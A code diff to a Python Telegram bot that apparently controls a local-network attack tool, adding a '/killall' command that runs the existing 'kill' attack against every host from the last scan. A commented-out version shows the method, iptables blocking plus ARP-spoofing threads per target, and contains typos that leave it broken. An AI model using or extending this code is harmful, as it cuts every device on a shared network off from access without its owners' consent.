@@ -573,6 +573,46 @@ def msg_scan(bot, update, args):
         print("[!!!] " + str(traceback.format_exc()))
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
+
+def msg_killall(bot, update, args):
+    global admin_chatid
+    if not str(update.message.chat_id) == str(admin_chatid):
+        return
+   
+    global latest_scan
+    print(latest_scan)
+    hosts = latest_scan[:]
+    print(hosts)
+    for host in hosts:
+        print(host)
+        target_ip = host[0]
+        msg_kill(bot, update, [target_ip])
+
+    '''
+    try:
+        if args == []:
+            global latest_scan
+            hosts = latest_scan[:]
+            target_mac = False
+            for host in hosts:
+                target_mac = host[1]
+                target_ip = host[0] ## I hope
+                target = [target_ip, target_mac]
+                iptables("kill", target=target[0])
+                if not attackManager("isattacked", target=target_ip):
+                    ID = attackManager("new", attack_type="kill", target=target_ip)
+                    kill_thread = threading.Thread(target=arpSpoof, args=[target])
+                    kil_thread.deamon = True
+                    kill_thread.start()
+                else:
+                    ID = atackManager("new", attack_type="kill", target=target_ip)
+
+                bot.send_message(chat_it=update.message.chat_id, text="starting, ID: " + str(ID))
+    except:
+        bot.send_message(chat_it=update.message.chat_id, text="failed")
+    '''
+        
+                        
 def msg_kill(bot, update, args):
     global admin_chatid
     if not str(update.message.chat_id) == str(admin_chatid):
@@ -1052,6 +1092,8 @@ def main():
     dispatcher.add_handler(scan_handler)
     kill_handler = CommandHandler('kill', msg_kill, pass_args=True)
     dispatcher.add_handler(kill_handler)
+    killall_handler = CommandHandler('killall', msg_killall, pass_args=True)
+    dispatcher.add_handler(killall_handler)
     stop_handler = CommandHandler('stop', msg_stop, pass_args=True)
     dispatcher.add_handler(stop_handler)
     attacks_handler = CommandHandler('attacks', msg_attacks, pass_args=True)
